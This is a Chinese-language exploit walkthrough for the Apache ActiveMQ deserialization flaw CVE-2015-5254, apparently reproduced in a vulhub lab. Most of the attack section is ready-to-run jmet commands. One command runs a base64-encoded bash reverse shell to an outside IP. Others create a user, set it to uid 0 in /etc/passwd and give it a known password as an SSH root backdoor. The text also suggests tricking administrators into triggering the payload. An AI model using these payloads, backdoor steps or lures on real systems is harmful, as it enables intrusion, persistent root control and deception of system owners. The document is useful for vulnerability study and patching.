前言

ApacheActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。

0X01 漏洞影响

ApacheActiveMQ 5.13.0之前的版本。

0X02 漏洞原理

ApacheActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。

0X03 环境搭建

下载vulhub、docker-compose来一键搭建环境，vulhub链接：https://vulhub.org/#/environments/activemq/CVE-2015-5254/

0X04 漏洞复现

1.浏览器打开站点，并进行初始化操作。


2.下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送，所以我们需要在ysoserial是gadget中选择一个可以使用，比如ROME。Jmet下载地址https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar）
3.执行命令
java -jarjmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/sucess" -YpROME   x.x.x.x   61616



4. 此时会给目标的ActiveMQ添加一个名为事件的队列，可以我们通过http://x.x.x.x:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息：


 5.点击查看这条消息即可触发命令执行。


6.此时进入容器。


7.可看到/ tmp /success已成功创建，说明漏洞利用成功。


8.反弹shell:
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ-s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS45C4yNDMuMTY3LzMwMDAwIDA+JjE=}|{base64,-d}|{bash,-i}”-Yp ROME x.x.x.x 61616

   值得注意的是，通过网络管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。
9.添加用户
  • 执行jmet的命令添加test用户并将其添加到root组,返回http://192.168.x.x:8161/admin/browse.jsp?JMSDestination=event页面，点击一下消息，触发它：
     
    java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "useradd -g root -s /bin/bash -u 10010 test" -Yp ROME  192.168.189.128  61616


  • 让我们再将passwd中的test的uid修改为0，使它拥有root权限,返回http://192.168.x.x:8161/admin/browse.jsp?JMSDestination=event页面，点击一下消息，触发它。
     
    java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "sed -i "s/test:x:10010/test:x:0/g" /etc/passwd" -Yp ROME   192.168.189.128  61616


  • 让我们再为test用户设置一个密码,返回http://192.168.x.x:8161/admin/browse.jsp?JMSDestination=event页面，点击一下消息，触发它。

     java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "echo "test:sd123456" | chpasswd" -Yp ROME   192.168.189.128   61616


  • 到此为止，一个权限为root，密码为123456的用户即创建完毕。我们可以使用ssh直接远程登陆进入操作系统，并且还是最高权限。


0X05 漏洞修复

更新active MQ到最新版本。
